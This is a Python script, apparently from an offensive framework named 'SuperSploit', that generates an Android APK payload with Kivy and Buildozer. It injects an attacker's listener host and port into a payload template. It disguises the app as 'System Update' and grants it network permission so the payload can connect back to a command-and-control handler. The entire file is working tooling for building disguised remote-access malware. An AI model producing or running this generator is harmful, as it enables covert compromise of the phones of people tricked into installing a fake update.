#!/usr/bin/env python3
import os
import sys
import argparse
import subprocess
import shutil
from pathlib import Path


class BuildozerPayloadGenerator:
    """
    Generates a pure-Python Android APK payload using Kivy and Buildozer.
    It dynamically writes the payload to a main.py file, generates a 
    buildozer.spec config, and cross-compiles it.
    """
    def __init__(self, lhost, lport, output_apk_path, app_name="System Update", template_path=None):
        self.lhost = lhost
        self.lport = str(lport)
        self.output_apk = os.path.abspath(output_apk_path)
        self.app_name = app_name
        
        # Determine the framework's installation root
        current_dir = os.path.dirname(os.path.abspath(__file__))
        install_root = os.path.abspath(os.path.join(current_dir, "..", ".."))

        if template_path:
            self.template_path = os.path.abspath(template_path)
        else:
            # Default to the templates/payload directory relative to the framework root
            self.template_path = os.path.join(install_root, "templates", "payload", "android_main_template.py")
            
        # Place the build directory in the framework's .data folder, not /tmp
        self.build_dir = os.path.join(install_root, ".data", "kivy_build")

    def generate(self):
        print(f"[*] Starting Buildozer Kivy Payload Generation (LHOST={self.lhost}, LPORT={self.lport})...")
        try:
            self._prepare_workspace()
            self._write_payload()
            self._write_buildozer_spec()
            self._compile_apk()
            self._extract_apk()
        except subprocess.CalledProcessError as e:
            print(f"[-] Buildozer execution failed. Ensure buildozer is installed and configured. Error: {e}")
            sys.exit(1)
        except Exception as e:
            print(f"[-] An unexpected error occurred: {e}")
            sys.exit(1)
        finally:
            self._cleanup()

    def _prepare_workspace(self):
        print(f"[*] Preparing persistent build workspace in: {self.build_dir}")
        if not os.path.exists(self.build_dir):
            os.makedirs(self.build_dir)
        else:
            # Clean up old build artifacts to prevent stale compilation
            bin_dir = os.path.join(self.build_dir, "bin")
            if os.path.exists(bin_dir):
                print("[*] Cleaning old binaries from bin directory...")
                shutil.rmtree(bin_dir)

    def _write_payload(self):
        print(f"[*] Generating Kivy main.py payload from template ({self.template_path})...")
        
        if not os.path.exists(self.template_path):
            raise FileNotFoundError(f"Template not found at {self.template_path}. Please ensure it exists.")
            
        with open(self.template_path, "r") as f:
            payload_code = f.read()
            
        # Inject the LHOST and LPORT into the template placeholders
        payload_code = payload_code.replace("{{LHOST}}", self.lhost)
        payload_code = payload_code.replace("{{LPORT}}", self.lport)

        payload_path = os.path.join(self.build_dir, "main.py")
        with open(payload_path, "w") as f:
            f.write(payload_code)

    def _write_buildozer_spec(self):
        print("[*] Generating buildozer.spec configuration...")
        spec_content = f"""[app]
title = {self.app_name}
package.name = sysupdate
package.domain = org.supersploit
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0.0

# Requirements: python3 and kivy are mandatory for the UI lifecycle
requirements = python3,kivy

# Permissions: We need INTERNET to connect back to the C2 handler
android.permissions = INTERNET

# Architecture: Compile for all major ABIs to prevent INSTALL_FAILED_NO_MATCHING_ABIS errors
android.archs = arm64-v8a, armeabi-v7a, x86_64, x86

# (Optional) Run the app in fullscreen mode
fullscreen = 1

[buildozer]
log_level = 1
warn_on_root = 1
"""
        spec_path = os.path.join(self.build_dir, "buildozer.spec")
        with open(spec_path, "w") as f:
            f.write(spec_content)

    def _compile_apk(self):
        print("[*] Executing Buildozer. This may take 5-15 minutes on the first run...")
        # Change directory to the build workspace, run buildozer, and capture output
        subprocess.run(
            ["buildozer", "android", "debug"], 
            cwd=self.build_dir, 
            check=True
        )

    def _extract_apk(self):
        print("[*] Extracting compiled APK...")
        bin_dir = os.path.join(self.build_dir, "bin")
        if not os.path.exists(bin_dir):
            raise FileNotFoundError("Buildozer bin/ directory not found. Compilation likely failed.")
        
        # Find the generated APK
        generated_apks = list(Path(bin_dir).glob("*.apk"))
        if not generated_apks:
            raise FileNotFoundError("No APK found in the bin/ directory.")
        
        target_apk = generated_apks[0]
        
        # Ensure output directory exists
        output_dir = os.path.dirname(self.output_apk)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        shutil.copy(str(target_apk), self.output_apk)
        print(f"[+] Successfully generated Python Android Payload at: {self.output_apk}")

    def _cleanup(self):
        # We don't want to completely nuke the buildozer environment every time,
        # as it takes minutes to download the NDK/SDK on every run.
        # Just clean up the source files we dropped in.
        print("[*] Cleaning up injected source files...")
        main_py = os.path.join(self.build_dir, "main.py")
        if os.path.exists(main_py):
            os.remove(main_py)


def main():
    parser = argparse.ArgumentParser(
        description="SuperSploit Android Payload Generator (Kivy/Buildozer)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument(
        "-l", "--lhost", 
        required=True, 
        help="Listener IP address (e.g., 192.168.1.50)"
    )
    
    parser.add_argument(
        "-p", "--lport", 
        required=True, 
        type=int, 
        help="Listener Port (e.g., 4444)"
    )
    
    parser.add_argument(
        "-o", "--output", 
        required=True, 
        help="Output path for the generated APK (e.g., /tmp/payload.apk)"
    )
    
    parser.add_argument(
        "-a", "--app-name", 
        default="System Update", 
        help="The name of the app installed on the device (default: 'System Update')"
    )
    
    parser.add_argument(
        "-t", "--template", 
        help="Path to a custom android_beacon_template.py file"
    )

    args = parser.parse_args()

    # Initialize and run generator
    generator = BuildozerPayloadGenerator(
        lhost=args.lhost,
        lport=args.lport,
        output_apk_path=args.output,
        app_name=args.app_name,
        template_path=args.template
    )
    
    generator.generate()


if __name__ == "__main__":
    main()
